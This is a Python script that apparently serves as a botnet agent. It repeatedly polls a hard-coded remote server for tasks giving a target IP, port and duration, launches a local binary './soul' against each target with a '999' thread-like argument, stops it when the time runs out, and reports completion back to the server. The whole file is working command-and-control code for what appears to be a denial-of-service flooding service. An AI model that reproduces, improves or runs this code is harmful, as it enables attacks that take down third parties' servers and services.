import requests
import subprocess
import time


BASE_URL = 'https://hingoli.io'
SOUL_PATH = '/57925436327885/'
DONE_PATH = '/57925436327885/done'
USER_AGENT = 'TG-SOULCRACK'


active_tasks = {}

def process_new_task(added):

    ip = added.get('ip')
    port = added.get('port')
    time_val = added.get('time')

    if ip and port and time_val:
        try:
            time_int = int(time_val)
        except ValueError:
            print(f"[!] Invalid 'time' value received: {time_val}. Skipping task.")
            return

        key = (ip, str(port), str(time_val))
        

        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            
            try:

                process = subprocess.Popen(['./soul', ip, str(port), str(time_val), '999'], start_new_session=True)
                print(f"[+] Launched binary: ./soul {ip} {port} {time_val} 999 (PID: {process.pid})")


                active_tasks[key] = {
                    'countdown': time_int,
                    'process': process
                }
            except FileNotFoundError:
                print(f"[!] Failed to launch binary: './soul' not found. Check PATH or permissions.")
            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
        else:
            # Task is already active, ignore
            pass
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():

    request_headers = {'User-Agent': USER_AGENT}
    
    while True:
        try:

            response = requests.get(
                f'{BASE_URL}{SOUL_PATH}', 
                headers=request_headers, # <-- User-Agent added here
                timeout=5
            )
            response.raise_for_status()
            data = response.json()

            # Server response parsing logic (handling dict or list)
            items_to_process = []
            if isinstance(data, dict):
                items_to_process.append(data)
            elif isinstance(data, list):
                items_to_process.extend(data)

            for item in items_to_process:
                if isinstance(item, dict):
                    # Flexible check for data wrapped in 'added' or raw item
                    task_data = item.get('added') or item 
                    process_new_task(task_data)


            tasks_to_delete = []
            for key, task_info in list(active_tasks.items()):
                task_info['countdown'] -= 1
                
                # Check for process termination
                if task_info['process'].poll() is not None:
                    pass 

                if task_info['countdown'] <= 0:
                    ip, port, orig_time = key
                    print(f"[+] Time expired for task: IP={ip}, Port={port}, Original Time={orig_time}")


                    if task_info['process'].poll() is None:
                        print(f"[!] Process (PID: {task_info['process'].pid}) still running. Sending terminate signal.")
                        task_info['process'].terminate()


                    try:
                        del_resp = requests.get(
                            f'{BASE_URL}{DONE_PATH}',
                            params={'ip': ip, 'port': port, 'time': orig_time},
                            headers=request_headers, # <-- User-Agent added here
                            timeout=5
                        )
                        if del_resp.status_code == 200:
                            print(f"[+] Sent delete request for IP={ip}, Port={port}, Time={orig_time}")
                        else:
                            print(f"[!] Delete request failed with status: {del_resp.status_code}")
                    except Exception as e:
                        print(f"[!] Failed to send delete request: {e}")
                        
                    tasks_to_delete.append(key)

            for key in tasks_to_delete:
                active_tasks.pop(key, None)
            
            time.sleep(1)

        except requests.RequestException as e:
            print(f"[!] Request error (Server down/Timeout): {e}")
            time.sleep(5) 
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(5) 

if __name__ == '__main__':
    print("--- Task Started ---")
    main_loop()